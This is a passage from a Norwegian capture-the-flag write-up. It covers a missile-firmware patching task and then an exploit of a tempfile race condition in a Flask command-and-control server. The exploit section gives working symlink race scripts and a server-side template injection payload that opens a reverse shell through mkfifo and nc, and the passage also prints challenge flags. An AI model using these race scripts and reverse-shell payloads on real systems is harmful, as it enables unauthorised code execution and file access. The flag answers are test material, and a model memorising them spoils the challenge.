Distance: 1293026.5173402096 - Time of Flight: 1200.0 - Distance/TOF: 1077.522097783508
Distance: 1311433.3252238766 - Time of Flight: 1000.0 - Distance/TOF: 1311.4333252238766
Distance: 1339603.8980102893 - Time of Flight: 1100.0 - Distance/TOF: 1217.8217254638994
Distance: 1351068.7739735628 - Time of Flight: 1600.0 - Distance/TOF: 844.4179837334767
Distance: 1405361.7044354093 - Time of Flight: 1100.0 - Distance/TOF: 1277.6015494867356
Distance: 1411325.99611136 - Time of Flight: 1100.0 - Distance/TOF: 1283.023632828509
Distance: 1450589.2628414233 - Time of Flight: 1200.0 - Distance/TOF: 1208.824385701186
Distance: 1453023.3903872136 - Time of Flight: 1700.0 - Distance/TOF: 854.7196414042432
Distance: 1468197.1626789959 - Time of Flight: 1300.0 - Distance/TOF: 1129.3824328299968
Distance: 1506467.74026547 - Time of Flight: 1100.0 - Distance/TOF: 1369.5161275140636
Distance: 1519089.0211525294 - Time of Flight: 1500.0 - Distance/TOF: 1012.7260141016862
Distance: 1565793.7530927446 - Time of Flight: 1500.0 - Distance/TOF: 1043.8625020618297
Distance: 1580386.814366429 - Time of Flight: 1500.0 - Distance/TOF: 1053.5912095776193
Distance: 1609795.4943599436 - Time of Flight: 1600.0 - Distance/TOF: 1006.1221839749647
Distance: 1641568.9514015021 - Time of Flight: 1700.0 - Distance/TOF: 965.62879494206
Distance: 1710921.043500996 - Time of Flight: 1700.0 - Distance/TOF: 1006.42414323588
Distance: 1732740.667998054 - Time of Flight: 1300.0 - Distance/TOF: 1332.87743692158
Distance: 1747809.0476979413 - Time of Flight: 1600.0 - Distance/TOF: 1092.3806548112134
Distance: 1772308.7041964093 - Time of Flight: 1300.0 - Distance/TOF: 1363.3143878433918
Distance: 1782415.0479200284 - Time of Flight: 1800.0 - Distance/TOF: 990.2305821777936
Distance: 1819740.3098170958 - Time of Flight: 1900.0 - Distance/TOF: 957.7580577984714
Distance: 1853500.774347373 - Time of Flight: 1900.0 - Distance/TOF: 975.5267233407227
Distance: 1889860.569262299 - Time of Flight: 2000.0 - Distance/TOF: 944.9302846311494
Distance: 1897069.5809633008 - Time of Flight: 1500.0 - Distance/TOF: 1264.7130539755337
Distance: 1912908.8580703784 - Time of Flight: 1800.0 - Distance/TOF: 1062.7271433724325
Distance: 1914674.369283808 - Time of Flight: 2000.0 - Distance/TOF: 957.337184641904
Distance: 1932985.6228606955 - Time of Flight: 1600.0 - Distance/TOF: 1208.1160142879346
Distance: 1946924.4505204486 - Time of Flight: 2000.0 - Distance/TOF: 973.4622252602243
Distance: 2007013.7951378133 - Time of Flight: 1550.0 - Distance/TOF: 1294.847609766331
Distance: 2033289.0976990887 - Time of Flight: 1900.0 - Distance/TOF: 1070.152156683731
Distance: 2082487.3067442677 - Time of Flight: 1800.0 - Distance/TOF: 1156.9373926357043
Distance: 2101044.0567982495 - Time of Flight: 1600.0 - Distance/TOF: 1313.152535498906
Distance: 2137414.664839351 - Time of Flight: 2000.0 - Distance/TOF: 1068.7073324196756
Distance: 2177246.8662748435 - Time of Flight: 1400.0 - Distance/TOF: 1555.1763330534595
Distance: 2204009.2435102407 - Time of Flight: 1500.0 - Distance/TOF: 1469.3394956734937
Distance: 2207768.402966359 - Time of Flight: 2000.0 - Distance/TOF: 1103.8842014831796
Distance: 2215078.945614269 - Time of Flight: 1400.0 - Distance/TOF: 1582.199246867335
Distance: 2231092.6606392763 - Time of Flight: 2000.0 - Distance/TOF: 1115.5463303196382
Distance: 2239277.0724439276 - Time of Flight: 1700.0 - Distance/TOF: 1317.2218073199574
Distance: 2257608.199286598 - Time of Flight: 1600.0 - Distance/TOF: 1411.0051245541235
Distance: 2266828.433244026 - Time of Flight: 1600.0 - Distance/TOF: 1416.767770777516
Distance: 2295831.850452401 - Time of Flight: 1700.0 - Distance/TOF: 1350.48932379553
Distance: 2299594.3277599183 - Time of Flight: 1600.0 - Distance/TOF: 1437.246454849949
Distance: 2329805.381936575 - Time of Flight: 2000.0 - Distance/TOF: 1164.9026909682875
Distance: 2330857.228655695 - Time of Flight: 2100.0 - Distance/TOF: 1109.932013645569
Distance: 2366856.8442280795 - Time of Flight: 1600.0 - Distance/TOF: 1479.2855276425498
Distance: 2558155.198729103 - Time of Flight: 1750.0 - Distance/TOF: 1461.8029707023445
Distance: 2672868.1646775766 - Time of Flight: 1800.0 - Distance/TOF: 1484.9267581542092
Distance: 2679267.842135778 - Time of Flight: 1800.0 - Distance/TOF: 1488.4821345198768
Distance: 2696890.090424191 - Time of Flight: 2000.0 - Distance/TOF: 1348.4450452120957
Distance: 2960229.4683541474 - Time of Flight: 2000.0 - Distance/TOF: 1480.1147341770736
Distance: 2962600.502655174 - Time of Flight: 2000.0 - Distance/TOF: 1481.3002513275871
Distance: 3064300.340851306 - Time of Flight: 2000.0 - Distance/TOF: 1532.150170425653
Distance: 3498845.2588418713 - Time of Flight: 2200.0 - Distance/TOF: 1590.384208564487
Distance: 3682334.5674927537 - Time of Flight: 2200.0 - Distance/TOF: 1673.7884397694336
```

Man kan se at relasjonen mellom flytiden og distansen blir i snitt høyere desto lengre distansen er. I tillegg ser vi at det er litt slingringsmonn i flytiden.
Basert på distansen som missilene måtte gå for å treffe midten av atlanterhavet så kom jeg frem til at `TOF ~= Distance / 1500`.

Etter å ha regnet det ut fikk jeg dette resultatet:

```text
Submarine 1 - Distance: 4148201.467647918 - Recommended _tof: 2800.0 (00e0a540)
Submarine 2 - Distance: 4740515.669383748 - Recommended _tof: 3200.0 (0000a940)
Submarine 3 - Distance: 6031013.339962457 - Recommended _tof: 4000.0 (0040af40)
Submarine 4 - Distance: 3509224.261450487 - Recommended _tof: 2300.0 (00f8a140)
Submarine 5 - Distance: 3177066.054664542 - Recommended _tof: 2100.0 (0068a040)
```

Hex-verdien i parantes er de rå bytene som `_tof` skal patches med.

Jeg lagde da 5 firmwares, hvor alle hadde samme `_target`, men forskjellig `_tof`. Deretter signerte jeg de, lastet de opp, flashet, og gjennomførte en simulering:

```bash
scp missile.1.3.37.fw_sub* login@cybertalent.no
ssh login@cybertalent.no
scp -i 2_oppdrag/sshkey_aurum missile.1.3.37.fw_sub* user@aurum:
ssh -i 2_oppdrag/sshkey_aurum user@aurum
signer --file-name missile.1.3.37.fw_sub1 --key-file privkey.pem --rng-source urandom
signer --file-name missile.1.3.37.fw_sub2 --key-file privkey.pem --rng-source urandom
signer --file-name missile.1.3.37.fw_sub3 --key-file privkey.pem --rng-source urandom
signer --file-name missile.1.3.37.fw_sub4 --key-file privkey.pem --rng-source urandom
signer --file-name missile.1.3.37.fw_sub5 --key-file privkey.pem --rng-source urandom
python3 upload_file.py missile.1.3.37.fw_sub1
python3 upload_file.py missile.1.3.37.fw_sub2
python3 upload_file.py missile.1.3.37.fw_sub3
python3 upload_file.py missile.1.3.37.fw_sub4
python3 upload_file.py missile.1.3.37.fw_sub5
python3 upload_and_run.py <enhexed shellcode fra generate_arm_flash_all.py>
python3 init_simulation.py
```

Etter gode 3 ekte timer med simulering hadde alle 5 missilene ~~truffet~~ bommet, og 5 flagg dukket pent opp underveis.

```text
Kategori: 2. Oppdrag
Oppgave:  2.16_submarine_0
Svar:     4312ce7fbaea6a5587634a834afcb495
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```
```text
Kategori: 2. Oppdrag
Oppgave:  2.17_submarine_1
Svar:     9330f6fcf99fb2d1acdeb6e005a9477c
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```
```text
Kategori: 2. Oppdrag
Oppgave:  2.18_submarine_2
Svar:     4662c0ce7ed7d3cbb814cb60746f1d3a
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```
```text
Kategori: 2. Oppdrag
Oppgave:  2.19_submarine_3
Svar:     88ff4301442793cb1a1b8ef9c390f7a0
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```
```text
Kategori: 2. Oppdrag
Oppgave:  2.20_submarine_4
Svar:     963fd1126aa1db3a78d2bc402ee9bf91
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```

---

## 2.21_mission_complete

Etter å ha konkatenert flaggene er oppdraget utført! :partying_face:

```text
Kategori: 2. Oppdrag
Oppgave:  2.21_mission_complete
Svar:     4312ce7fbaea6a5587634a834afcb4959330f6fcf99fb2d1acdeb6e005a9477c4662c0ce7ed7d3cbb814cb60746f1d3a88ff4301442793cb1a1b8ef9c390f7a0963fd1126aa1db3a78d2bc402ee9bf91
Poeng:    5

Gratulerer! Du har reddet Europa! ... og fullført oppdraget :) Vi er mektig imponert :D

Ny fil: /home/login/2_oppdrag/mission_complete.jpg
```

![Mission complete!](images/mission_complete.jpg)

---

## 3.4.13_shady-aggregator_c2

I funksjonen `add_command` i `main.py` finner vi 2 race conditions:

```python
@app.route(PREFIX + "<client_id>/commands", methods=["POST"])
def add_command(client_id):
    upload_file = request.files.get("file", None)
    if not upload_file:
        logger.warning("missing file argument")
        return Response("", 400)

    with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
        command_file = f.name
        upload_file.save(command_file)

        try:
            obj = Command(f)
            obj.verify()
            print(obj.__str__())
            print(f"registering new command for client {client_id}")
            add_command_to_db(client_id, obj.run_after, command_file)
            return Response(f"OK\n", 200)

        except:
            print("invalid command or signature")
            return Response("", 400)


def add_command_to_db(client_id, run_after, command_path):
    with get_db() as db, open(command_path, "rb") as f:
        db.execute(
            """
            INSERT INTO commands (client, run_after, content)
            VALUES (?,?,?)
            ON CONFLICT(client, run_after)
            DO UPDATE SET content=excluded.content, delivered=FALSE
            """,
            (client_id, run_after, f.read()),
        )
```

Den første er `upload_file.save(command_file)`, som lagrer innholdet vi sender til serveren til et tilfeldig navn som den får fra `tempfile.NamedTemporaryFile`.

Den andre er i `add_command_to_db`, hvor den åpner filnavnet vi fikk fra `tempfile.NamedTemporaryFile`, leser innholdet, og skriver det inn i databasen. Dette skjer kun hvis filen som blir sendt består `obj.verify`-sjekken. Når filen er lest inn kan vi lese den ut ved å sende rett forespørsel til webserveren.


Merk også at `WORKSPACE` er satt til å være `/tmp/.../`, som er et filområde som vi har full tilgang til.

Tanken var da å bruke Python til å konstant lese etter nye filer i `/tmp/.../`, og erstatte filen med en gang den dukket opp med en symbolisk kobling til en fil som vi bestemmer.
Vi har da i teorien et utnyttelsesprimitiv for både lesing og skriving av filer, basert på timingen.

På et moderne, vanlig system så vil denne typen utnyttelser gjennom symbolske koblinger i `world-writable directories` ikke fungere grunnet denne kjernebeskyttelsen: https://sysctl-explorer.net/fs/protected_symlinks/. 
Denne beskyttelsen har stoppet meg flere ganger tidligere, men jeg er dum/dedikert nok til å bruke et flersifret antall timer på dette *just in case*. :)

For å teste om våre utnyttelsesprimitiv kan følge symbolske koblinger utenfor `/tmp`, så gjorde jeg et lite forsøk. 

Jeg kjørte følgende skript på `shady-aggregator`, etter å ha gjort hjemmemappen til `archive` tilgjengelig for alle (`chmod 777 -R /home/archive`):

```python
# race.py
import os
import time
import sys


def main():

    tmp_folder = "/tmp/.../"
    target_file = "/home/archive/you_should_not_see_me.secret"
    known_files = os.listdir(tmp_folder)

    for _ in range(100):

        tmp_file = tmp_folder + find_file(tmp_folder, known_files)
        print("File found:", tmp_file)
        file_race(tmp_file, target_file)
        time.sleep(0.1)

def find_file(tmp_folder, known_files):

    while True:
        for f in os.listdir(tmp_folder):
            if f not in known_files:
                return f


def file_race(tmp_file, target_file):
    
    try:
        os.unlink(tmp_file)
        os.symlink(target_file, tmp_file)
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
```

Dette kjørte jeg fra `corax`:

```python
# requester.py
import time
import sys
import requests

url = "http://shady-aggregator.utl/f52e6101/"
id = "DEADBEEFDEADBEEF" 
file_contents = open("a.txt", "rb").read()
file_form = {"file": open(sys.argv[1], "rb").read()}

for _ in range(100):
    requests.post(url + id + "/commands", files=file_form)
    time.sleep(1)
```

Etter et par iterasjoner kan vi se at innholdet til `a.txt` dukker opp i `/home/archive/you_should_not_see_me.secret`. 
Dette betyr enten at den beskyttelsen jeg nevnte er avskrudd, eller at noe annet rart har skjedd.
Hvem vet, datamaskiner er rare.

Dette var utnyttelsen av skrive-primitivet vårt. 
Lese-primitivet er ganske likt, bortsett fra litt forskjellig timing i `race.py`, og at `requester.py` i tillegg må lese tilbake innholdet som blir lagt inn i databasen.

For å teste hvor lang `sleep` måtte være så satte jeg opp en egen versjon av serveren på en privat maskin hvor jeg hadde lagt til debug-output som viste hvor lang tid de forskjellige operasjonene brukte:

```python
@app.route(PREFIX + "<client_id>/commands", methods=["POST"])
def add_command(client_id):
    start_time = time.time()
    upload_file = request.files.get("file", None)
    if not upload_file:
        logger.warning("missing file argument")
        return Response("", 400)

    with tempfile.NamedTemporaryFile(dir=WORKSPACE) as f:
        command_file = f.name
        upload_file.save(command_file)
        print(f"Time taken for file upload: {time.time() - start_time} seconds")

        try:
            obj = Command(f)
            obj.verify()
            print(f"Time taken for command verification: {time.time() - start_time} seconds")
            print(obj.__str__())
            print(f"registering new command for client {client_id}")
            add_command_to_db(client_id, obj.run_after, command_file)
            print(f"Time taken for database insertion: {time.time() - start_time} seconds")
            return Response(f"OK\n", 200)

        except:
            print("invalid command or signature")
            return Response("", 400)
```

De endelige `sleep`-verdiene finner du i skriptene [her](c2_scripts/racing).

Vi har da fungerende lese-/skrive-primitiver, men hvordan kan vi bruke disse for å få tilgang til `c2` brukeren som kjører serveren?

Jeg brukte mye tid på dette. Alt fra å prøve å skrive en `authorized_hosts` fil til `~/.ssh/`, eller å erstatte `main.py` med en versjon som hadde en bakdør implementert.

Dette funket da ikke siden `c2` brukeren ikke hadde en `.ssh/` mappe, og `main.py` lå i en mappe med et navn som jeg ikke visste om.

Jeg fokuserte da på filene som lå i `template/`. Om vi kunne overskrive disse så ville vi muligens kunne utnytte *Server Side Template Injection* for å få et reverse shell.

Mappen som `main.py` kjørte i kunne jeg aksessere gjennom `/proc/self/cwd/`. Gjennom denne kunne vi lett nå `/template`. "*Hvorfor brukte du ikke dette for å overskrive `main.py`?*" spør du kanskje. Jeg vet ikke. Jeg er uperfekt og glemmer ting.

Uansett, jeg fulgte stegene i [denne](https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e) nettsiden for å komme frem til nyttelasten som kunne gi meg et reverse shell gjennom SSTI. De endelige Python-skriptene finner du [her](c2_scripts/racing):

```bash
# På corax:
echo -n "{{'foo'.__class__.__base__.__subclasses__()[275].__init__.__globals__['sys'].modules['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc corax 4444 >/tmp/f').read()}}" > admin.txt
python3 requester_write.py admin.txt
# På shady-aggregator:
python3 race_write.py /proc/self/cwd/template/admin.txt
# Vent i ~10 iterasjoner
# På corax:
nc -lvnp 4444 &
curl http://shady-aggregator.utl/f52e6101/list
fg
whoami
# c2
ls -lR /home/c2
# /home/c2:
# total 4
# -rw-r--r-- 1 root root 40 Jan 11 21:38 FLAGG.c17b05
# drwxr-xr-x 1 c2   c2   43 Jan 12 00:28 app
# 
# /home/c2/app:
# total 136
# drwxr-xr-x 2 c2 c2     69 Jan 11 21:38 __pycache__
# -rw-r--r-- 1 c2 c2 122880 Jan 12 00:28 db.sqlite3
# -rw-r--r-- 1 c2 c2     64 Dec  2 14:47 gunicorn.conf.py
# -rwxr-xr-x 1 c2 c2   8594 Dec 20 14:55 main.py
# drwxr-xr-x 1 c2 c2     81 Nov 30 13:23 templates
# 
# /home/c2/app/__pycache__:
# total 16
# -rw-r--r-- 1 c2 c2  195 Jan 11 21:38 gunicorn.conf.cpython-39.pyc
# -rw-r--r-- 1 c2 c2 9180 Jan 11 21:38 main.cpython-39.pyc
# 
# /home/c2/app/templates:
# total 12
# -rw-r--r-- 1 c2 c2   0 Nov 30 13:23 admin.html
# -rw-r--r-- 1 c2 c2 278 Dec 29 13:37 admin.txt
# -rw-r--r-- 1 c2 c2 106 Nov 30 13:23 checkins.txt
# -rw-r--r-- 1 c2 c2 184 Nov 30 13:32 commands.txt
cat /home/c2/FLAGG.c17b05
# FLAGG: 3fe7dec0658e911f5ce1061f61343067
```

Forventet på ingen måte at dette var et *umulig* flagg, men jeg tar det jeg får.

```text
Kategori: 3.4. Utfordringer umulig
Oppgave:  3.4.13_shady-aggregator_c2
Svar:     3fe7dec0658e911f5ce1061f61343067
Poeng:    0

Ikke umulig, men ikke forventet. Uansett veldig godt jobba!

Ny fil: /home/login/2_oppdrag/sshkey_c2@shady-aggregator
```
